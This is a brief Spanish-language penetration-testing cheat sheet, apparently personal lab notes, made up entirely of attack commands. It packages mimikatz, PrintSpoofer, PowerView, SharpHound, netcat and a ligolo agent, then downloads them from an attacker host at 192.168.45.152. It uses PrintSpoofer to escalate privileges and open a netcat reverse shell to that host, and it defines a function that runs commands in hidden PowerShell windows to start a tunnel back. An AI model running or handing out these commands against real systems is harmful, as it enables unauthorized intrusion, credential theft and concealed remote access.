
### Subir tools

```bash
zip -r tools.zip agent.exe nc.exe PrintSpoofer64.exe mimikatz.exe PowerView.ps1 SharpHound.ps1
```
---
```bash
iwr -uri http://192.168.45.152:8000/tools.zip -Outfile tools.zip
```
---
```bash
Expand-Archive tools.zip -DestinationPath .
```

### WPE

```powershell
.\PrintSpoofer64.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.152 4444 -e cmd"
```

### Ejecucion en segundo plano

* Funcion

```powershell
function bg_exec($cmd) {
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c $cmd"
}
```
* ligolo:
```powershell
bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601 -ignore-cert"
```

